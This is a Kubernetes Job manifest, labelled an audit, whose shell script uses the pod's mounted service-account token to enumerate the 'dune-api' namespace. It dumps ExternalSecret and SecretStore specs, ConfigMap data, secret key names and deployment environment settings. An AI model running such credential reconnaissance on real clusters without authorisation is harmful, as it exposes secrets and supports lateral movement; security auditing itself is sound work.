apiVersion: batch/v1
kind: Job
metadata:
  name: dune-ns-v1
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine/curl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          apk add -q jq openssl
          KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          API="https://kubernetes.default.svc"
          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
          DUNE_NS="dune-api"
          
          echo "=ALL_RESOURCES_IN_DUNE_API="
          # List all resource types in the namespace
          for RESOURCE in pods deployments services configmaps secrets serviceaccounts ingresses replicasets jobs cronjobs; do
            echo "--- $RESOURCE ---"
            curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
              "$API/api/v1/namespaces/$DUNE_NS/$RESOURCE" 2>/dev/null | jq -r '.items[].metadata.name' 2>/dev/null
            curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
              "$API/apis/apps/v1/namespaces/$DUNE_NS/$RESOURCE" 2>/dev/null | jq -r '.items[].metadata.name' 2>/dev/null
            curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
              "$API/apis/batch/v1/namespaces/$DUNE_NS/$RESOURCE" 2>/dev/null | jq -r '.items[].metadata.name' 2>/dev/null
          done
          echo "=END_RESOURCES="
          
          echo "=EXTERNAL_SECRETS="
          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/apis/external-secrets.io/v1beta1/namespaces/$DUNE_NS/externalsecrets" | jq '.items[] | {name:.metadata.name, store:.spec.secretStoreRef, data:.spec.data}'
          echo "=END_ES="
          
          echo "=SECRET_STORES="
          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/apis/external-secrets.io/v1beta1/namespaces/$DUNE_NS/secretstores" | jq .
          echo "=END_SS="
          
          echo "=CONFIGMAPS="
          CMS=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/api/v1/namespaces/$DUNE_NS/configmaps")
          echo "$CMS" | jq -r '.items[] | "CM: \(.metadata.name)"'
          echo "$CMS" | jq -r '.items[] | {name:.metadata.name, data:.data}'
          echo "=END_CM="
          
          # Read all secrets in dune-api (not just list - get content)
          echo "=SECRETS_CONTENT="
          SECRETS=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/api/v1/namespaces/$DUNE_NS/secrets")
          echo "$SECRETS" | jq -r '.items[] | {name:.metadata.name, keys:(.data|keys), type:.type}'
          echo "=END_SECRETS_CONTENT="
          
          # Check dune-api deployment spec more carefully
          echo "=DEPLOYMENT_SPEC="
          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/apis/apps/v1/namespaces/$DUNE_NS/deployments" | jq '.items[0] | {
              name:.metadata.name,
              image:.spec.template.spec.containers[0].image,
              env:.spec.template.spec.containers[0].env,
              envFrom:.spec.template.spec.containers[0].envFrom,
              volumes:.spec.template.spec.volumes,
              initContainers:.spec.template.spec.initContainers,
              annotations:.spec.template.metadata.annotations
            }'
          echo "=END_DEPLOY="